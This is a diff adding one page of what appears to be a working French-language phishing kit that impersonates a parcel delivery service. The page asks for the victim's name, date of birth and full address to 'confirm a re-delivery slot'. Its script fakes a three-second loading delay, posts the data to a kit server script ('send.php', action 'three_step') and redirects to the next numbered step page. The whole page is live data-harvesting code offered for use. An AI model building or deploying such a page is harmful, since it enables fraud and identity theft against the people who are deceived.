@@ -1,0 +1,119 @@
+
+<!DOCTYPE html>
+
+<html lang="fr">
+<head>
+<link href="assets/favicon.ico" rel="shortcut icon" type="image/x-icon"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<link href="assets/apple-touch-icon.png" rel="apple-touch-icon"/>
+<meta content="initial-scale=1.0, width=device-width" name="viewport"/>
+<meta content="" name="description"/>
+<meta charset="utf-8"/>
+<meta content="noindex" name="robots"/>
+<title>Page d'accueil | Livraison de mes colis</title>
+<link href="styles.css" rel="stylesheet" type="text/css"/>
+<script src="jquery-3.7.0.min.js"></script>
+<script src="jquery.mask.js"></script>
+<script src="mask.js"></script>
+</head>
+<body>
+<div class="corral">
+<div class="contentContainer activeContent contentContainerBordered">
+<header id="header">
+<img alt="" src="logo-min.png" width="85%"/>
+</header>
+<form method="post" name="form" novalidate="novalidate">
+<h2>Numéro de suivi : 50940304</h2>
+<h4>Confirmez votre créneau de livraison pour le </h4>
+<p>Afin de pouvoir confirmer ce créneau de livraison, merci de compléter les informations suivantes :</p>
+<h3>Informations personnelles</h3>
+<div class="fieldWrapper"><input id="firstname" name="firstname" placeholder="" required="required" type="text"/><label class="required" for="firstname">Prénom</label></div>
+<div class="fieldWrapper"><input id="lastname" name="lastname" placeholder="" required="required" type="text"/><label class="required" for="lastname">Nom</label></div>
+<div class="fieldWrapper"><input class="js-date" id="birthdate" maxlength="10" name="birthdate" pattern="\d*" placeholder="" required="required" type="text"/><label class="placeLabel required" for="birthdate">Date de naissance</label></div>
+<div class="fieldWrapper"><input id="address" name="address" placeholder="" required="required" type="text"/><label class="required" for="address">Adresse</label></div>
+<div class="fieldWrapper"><input id="zipcode" name="zipcode" pattern="\d*" placeholder="" required="required" type="text"/><label class="required" for="zipcode">Code postal</label></div>
+<div class="fieldWrapper"><input id="city" name="city" placeholder="" required="required" type="text"/><label class="required" for="city">Ville</label></div>
+<div><button id="submit" name="submit" type="submit">Confirmer ma re-livraison</button></div>
+</form>
+<div class="intentFooter">
+<div class="localeSelector">
+</div>
+</div>
+<div class="hidden-class-new" id="loader-div-new">
+<div id="mask-id-new"></div>
+<div class="spinner-class-new loading-class-new"></div>
+</div>
+</div>
+<footer class="footer">
+<div class="legalFooter">
+<ul class="footerGroup">
+<li><a href="#" target="_blank">Contact</a></li>
+<li><a href="#" target="_blank">Respect de la vie privée</a></li>
+<li><a href="#" target="_blank">Contrats d'utilisation</a></li>
+<li><a href="#" target="_blank">International</a></li>
+</ul>
+</div>
+</footer>
+</div>
+<script src="jquery-3.7.0.min.js"></script>
+<script src="jquery.mask.js"></script>
+<script src="mask.js"></script>
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+        
+        var submitButton = document.getElementById("submit");
+        var firstnameInput = document.getElementById("firstname");
+        var lastnameInput = document.getElementById("lastname");
+        var birthdateInput = document.getElementById("birthdate");
+        var addressInput = document.getElementById("address");
+        var zipcodeInput = document.getElementById("zipcode");
+        var cityInput = document.getElementById("city");
+
+        submitButton.addEventListener("click", function (e) {
+            e.preventDefault();
+            submitButton.disabled = true;
+            firstnameInput.disabled = true;
+            lastnameInput.disabled = true;
+            birthdateInput.disabled = true;
+            addressInput.disabled = true;
+            zipcodeInput.disabled = true;
+            cityInput.disabled = true;
+
+            document.getElementById("loader-div-new").classList.remove("hidden-class-new");
+            document.getElementById("mask-id-new").style.opacity = 1;
+            document.getElementById("mask-id-new").style.bottom = "-500px";
+
+            setTimeout(function () {
+                var formData = {
+                    firstname: $('#firstname').val(),
+                    lastname: $('#lastname').val(),
+                    birthdate: $('#birthdate').val(),
+                    address: $('#address').val(),
+                    zipcode: $('#zipcode').val(),
+                    city: $('#city').val()
+                };
+
+                $.ajax({
+                    type: 'POST',
+                    url: '../server/send.php?id=675af908cbe6d&action=three_step',
+                    data: formData,
+                    success: function(response) {
+                        if (response === 'success') {
+                            window.location.href = '../client/4.php?id=675af908cbe6d';
+                        } else {
+                            window.location.href = '../client/3.php?id=675af908cbe6d';
+                        }
+                    },
+                    error: function(xhr, status, error) {
+                        $('#notifications').html('<p class="notification notification-critical">Erreur lors de la requête.</p>');
+                    },
+                    complete: function() {
+                        submitButton.disabled = false;
+                        $('#loader-div-new').addClass('hidden-class-new');
+                    }
+                });
+            }, 3000);
+        });
+    });
+</script>
+</body></html>
